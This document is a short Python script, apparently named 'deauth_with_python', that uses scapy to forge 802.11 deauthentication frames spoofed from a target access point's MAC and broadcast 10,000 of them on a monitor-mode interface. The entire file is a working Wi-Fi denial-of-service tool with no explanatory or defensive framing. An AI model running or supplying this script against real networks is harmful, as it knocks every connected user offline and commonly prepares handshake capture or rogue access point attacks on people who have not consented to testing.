#!/usr/bin/python3
from scapy.all import *
import sys

if len(sys.argv) != 2:
    print("python3 deauth_with_python target")
    sys.exit()

brdmac = "ff:ff:ff:ff:ff:ff"
pkt = RadioTap() / Dot11(addr1= brdmac,addr2=str(sys.argv[1]),addr3 = str(sys.argv[1])) / Dot11Deauth()
sendp(pkt,iface='wlan1mon',count=10000)